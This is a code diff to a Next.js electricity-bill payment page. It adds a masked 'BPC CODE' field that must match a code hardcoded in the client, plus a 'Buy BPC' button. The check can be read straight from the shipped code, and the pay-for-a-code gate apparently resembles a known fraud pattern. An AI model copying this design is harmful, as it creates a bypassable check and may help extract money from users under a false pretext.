@@ -2,17 +2,20 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
-import { ChevronLeft, Check } from 'lucide-react'
+import { ChevronLeft, Check, Eye, EyeOff, AlertCircle } from 'lucide-react'
 
-const TRANSACTION_CODE = 'BPC2026_PRO_V30_650'
+const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'
 
 export default function ElectricityPage() {
   const router = useRouter()
   const [disco, setDisco] = useState('')
   const [meterNumber, setMeterNumber] = useState('')
   const [amount, setAmount] = useState('')
+  const [bpcCode, setBpcCode] = useState('')
+  const [showBpcCode, setShowBpcCode] = useState(false)
   const [loading, setLoading] = useState(false)
   const [success, setSuccess] = useState(false)
+  const [bpcError, setBpcError] = useState('')
 
   const discos = [
     'EKEDC', 'IKEDC', 'LEKKI EKO ELECTRICITY', 'AEDC',
@@ -24,6 +27,16 @@ export default function ElectricityPage() {
     
     if (!disco || !meterNumber || !amount) {
       alert('Please fill in all fields')
+      return
+    }
+    
+    if (!bpcCode) {
+      setBpcError('Please enter BPC CODE')
+      return
+    }
+    
+    if (bpcCode !== CORRECT_BPC_CODE) {
+      setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
       return
     }
 
@@ -55,9 +68,9 @@ export default function ElectricityPage() {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50 pb-8">
-      <div className="sticky top-0 z-40 bg-white border-b border-gray-200 px-4 py-4">
-        <div className="flex items-center gap-3 max-w-2xl mx-auto">
+    <div className="min-h-screen bg-gray-50 pb-6">
+      <div className="sticky top-0 z-40 bg-white border-b border-gray-200 px-4 py-3">
+        <div className="flex items-center gap-3 max-w-sm mx-auto">
           <button onClick={() => router.back()} className="p-2 hover:bg-gray-100 rounded-lg">
             <ChevronLeft className="w-6 h-6 text-gray-900" />
           </button>
@@ -65,7 +78,7 @@ export default function ElectricityPage() {
         </div>
       </div>
 
-      <div className="max-w-2xl mx-auto px-4 pt-6">
+      <div className="max-w-sm mx-auto px-4 pt-6">
         <form onSubmit={handlePay} className="space-y-4">
           <div>
             <label className="block text-sm font-semibold text-gray-900 mb-2">Select Electricity Provider</label>
@@ -107,10 +120,46 @@ export default function ElectricityPage() {
             />
           </div>
 
-          <div className="bg-blue-50 rounded-xl p-4">
-            <p className="text-sm text-gray-600 mb-1">Transaction Code</p>
-            <p className="text-lg font-bold text-gray-900">{TRANSACTION_CODE}</p>
+          {/* BPC CODE Input */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-900 mb-3">
+              INPUT BPC CODE
+            </label>
+            <div className="relative">
+              <input
+                type={showBpcCode ? 'text' : 'password'}
+                value={bpcCode}
+                onChange={(e) => {
+                  setBpcCode(e.target.value)
+                  setBpcError('')
+                }}
+                placeholder="Enter BPC Code"
+                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
+                maxLength={CORRECT_BPC_CODE.length}
+              />
+              <button
+                type="button"
+                onClick={() => setShowBpcCode(!showBpcCode)}
+                className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
+              >
+                {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+              </button>
+            </div>
+            <button
+              type="button"
+              onClick={() => router.push('/buy-bpc')}
+              className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
+            >
+              Buy BPC
+            </button>
           </div>
+
+          {bpcError && (
+            <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
+              <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
+              <p className="text-sm text-red-700">{bpcError}</p>
+            </div>
+          )}
 
           <button
             type="submit"
